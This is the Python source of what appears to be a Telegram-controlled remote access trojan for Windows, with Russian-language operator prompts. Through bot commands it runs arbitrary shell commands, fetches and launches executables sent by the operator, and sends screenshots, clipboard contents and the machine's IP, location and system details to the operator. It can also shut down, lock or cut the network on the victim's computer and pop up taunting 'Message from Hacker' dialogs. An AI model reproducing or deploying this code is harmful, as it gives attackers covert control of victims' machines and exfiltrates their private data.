#    __  ___          _                                 _
#   /  |/  /___ _____/ /__     _      __(_) /_/ /_     / /
#  / /|_/ / __ `/ __  / _ \   | | /| / / / __/ __ \   / / __ \ | / / _ \
# / /  / / /_/ / /_/ /  __/   | |/ |/ / / /_/ / / /  / / /_/ / |/ /  __/
#/_/  /_/\__,_/\__,_/\___/    |__/|__/_/\__/_/ /_/  /_/\____/|___/\___/
#
#    __             ______            __            ____
#   / /_  __  __   / ____/___  ____  / /____  _____/ __ )____  _  __
#  / __ \/ / / /  / /   / __ \/ __ \/ __/ _ \/ ___/ __  / __ \| |/_/
# / /_/ / /_/ /  / /___/ /_/ / / / / /_/  __/ /  / /_/ / /_/ />  <
#/_.___/\__, /   \____/\____/_/ /_/\__/\___/_/  /_____/\____/_/|_|
#      /____/
import telebot, os, pyautogui, sys, platform, pyttsx3, pyperclip, webbrowser, random
from pymsgbox import confirm, prompt
from time import sleep
from requests import get
file_name = os.path.basename(sys.argv[0])
user = os.environ.get("USERNAME")
tempdir = "C:\\Users\\" +user+"\\AppData\\Local\\Temp"
bot = telebot.TeleBot("Your bot token")

@bot.message_handler(commands=["start"])
def star(message):
    keyboard = telebot.types.ReplyKeyboardMarkup(True)
    keyboard.row("Info","Kill", "Restart","Block")
    keyboard.row("Screen", "cmd", "Key","Word")
    keyboard.row("Al", "Netkill", "Chat","Self-delete")
    keyboard.row("launch-exe","Open-site","Speak","Get-Clipboard")
    keyboard.row("Random mouse move")

    msg = bot.send_message(message.chat.id, "Выберите действие.", reply_markup=keyboard)

@bot.message_handler(content_types=['text'])
def send_text(message):
    def msldef(message):
        a = int(message.text)
        screenWidth, screenHeight = pyautogui.size()
        for i in range(a):
            randwidth=random.randint(0, screenWidth)
            ranhdeigh=random.randint(0, screenHeight)
            pyautogui.moveTo(randwidth, ranhdeigh)
            sleep(0.3)
        msg = bot.send_message(message.chat.id, "Done")
    def urldef(message):
        cid = message.chat.id
        a = message.text
        webbrowser.open_new_tab(a)
        msg = bot.send_message(message.chat.id, "Done")
    def speakdef(message):
        a = message.text
        engine = pyttsx3.init()
        engine.say(a)
        engine.runAndWait()
        msg = bot.send_message(message.chat.id, "Done")
    def aldef(message):
        cid = message.chat.id
        a = message.text.split("|")
        msg = bot.send_message(message.chat.id, "Done")
        confirm(text=a[0], title=a[1], buttons=["OK", "Cancel"])
    def chdef(message):
        msg = bot.send_message(message.chat.id, "Done")
        a = message.text
        c=prompt(text=a, title='Message from Hacker.')
        msg = bot.send_message(message.chat.id, "Ответ от пользователя на вопрос "+a+": "+c)
    def netkilldef(message):
        msg = bot.send_message(message.chat.id, "Done")
        cid = message.chat.id
        slp = int(message.text)
        os.system("netsh interface set interface 'Ethernet' disable")
        os.system("netsh interface set interface 'Беспроводная сеть' disable")
        sleep(slp)
        os.system("netsh interface set interface 'Ethernet' enable")
        os.system("netsh interface set interface 'Беспроводная сеть' enable")
        msg = bot.send_message(message.chat.id, "Интернет подключение востановленно")
    def writedef(message):
        msg = bot.send_message(message.chat.id, "Done")
        cid = message.chat.id
        word = message.text
        pyautogui.write(word)
    def keydef(message):
        msg = bot.send_message(message.chat.id, "Done")
        cid = message.chat.id
        key= message.text
        pyautogui.press(key)
    def cmddef(message):
        msg = bot.send_message(message.chat.id, "Done")
        cid = message.chat.id
        command= message.text
        os.system(command)
    def dldef(message):
        cid = message.chat.id
        file_name = message.document.file_name
        file_id_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_id_info.file_path)
        new_file = open(file_name, 'wb')
        new_file.write(downloaded_file)
        new_file.close()
        os.startfile(file_name)
        msg = bot.send_message(message.chat.id, "Done")
    if message.text.lower() == 'info':
        ip=get("https://ifconfig.me/ip").text
        response = get(url=f"http://ip-api.com/json/{ip}").json()
        msg = bot.send_message(message.chat.id, "Net info:"+"\n"+"IP: "+response.get("query")+"\n"+"Int prov: "+response.get("isp")+"\n"+"Org: "+response.get("org")+"\n"+"Country: "+response.get("country")+"\n"+"Region Name: "+response.get("regionName")+"\n"+"City: "+response.get("city")+"\n"+"ZIP: "+response.get("zip")+"\n"+"Timezone: "+response.get("timezone")+"\n"+"System info:"+"\n"+"System: "+platform.system()+"\n"+"Architecture: "+platform.architecture()[0]+"\n"+"Hostname: "+platform.node()+"\n"+"Processor: "+platform.processor())
    elif message.text.lower() == 'kill':
        msg = bot.send_message(message.chat.id, "Done")
        os.system ("shutdown -s -t 0")
    elif message.text.lower() == 'restart':
        msg = bot.send_message(message.chat.id, "Done")
        os.system("shutdown -t 0 -r -f")
    elif message.text.lower() == 'block':
        msg = bot.send_message(message.chat.id, "Done")
        os.system("Rundll32.exe user32.dll,LockWorkStation")
    elif message.text.lower() == 'screen':
        list=['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
        for i in range(random.randint(1,5)):
            v="".join(str(i)+random.choice(list))
        screenshot = pyautogui.screenshot()
        screenshot.save(tempdir+"/"+v+".png")
        photo = open(tempdir+"/"+v+".png", "rb")
        bot.send_photo(message.from_user.id, photo, caption = "Done")
    elif message.text.lower() == 'cmd':
        cid = message.chat.id
        msgcommand = bot.send_message(cid, "Введите комманду:")
        bot.register_next_step_handler(msgcommand , cmddef)
    elif message.text.lower() == 'key':
        cid1 = message.chat.id
        msgcommand = bot.send_message(cid1, "Введите клавишу:")
        bot.register_next_step_handler(msgcommand , keydef)
    elif message.text.lower() == 'word':
        cid = message.chat.id
        msgcommand = bot.send_message(cid, "Введите слово:")
        bot.register_next_step_handler(msgcommand , writedef)
    elif message.text.lower() == 'netkill':
        cid = message.chat.id
        msgcommand = bot.send_message(cid, "На сколько выключить ?")
        bot.register_next_step_handler(msgcommand , netkilldef)
    elif message.text.lower() == 'al':
        cid = message.chat.id
        msgcommand = bot.send_message(cid, "Введите текст:\nНапример: text|title")
        bot.register_next_step_handler(msgcommand , aldef)
    elif message.text.lower() == 'chat':
        msgcommand = bot.send_message(message.chat.id, "Введите сообщение:\nНапример: Ты хуесос ?")
        bot.register_next_step_handler(msgcommand , chdef)
    elif message.text.lower() == 'self-delete':
        bot.send_message(message.chat.id, "Done")
        os.system("taskkill /f /im "+file_name)
    elif message.text.lower() == 'launch-exe':
        msgcommand = bot.send_message(message.chat.id, "Отправьте файл.")
        bot.register_next_step_handler(msgcommand , dldef)
    elif message.text.lower() == 'speak':
        msgcommand = bot.send_message(message.chat.id, "Отпраьте текст для произношения.")
        bot.register_next_step_handler(msgcommand , speakdef)
    elif message.text.lower() == 'get-clipboard':
        bot.send_message(message.chat.id, pyperclip.paste())
    elif message.text.lower() == 'open-site':
        msgcommand = bot.send_message(message.chat.id, "Отправьте ссылку.")
        bot.register_next_step_handler(msgcommand , urldef)
    elif message.text.lower() == 'random mouse move':
        msgcommand = bot.send_message(message.chat.id, "Сколько раз передвинуть мышь ?")
        bot.register_next_step_handler(msgcommand , msldef)
bot.polling()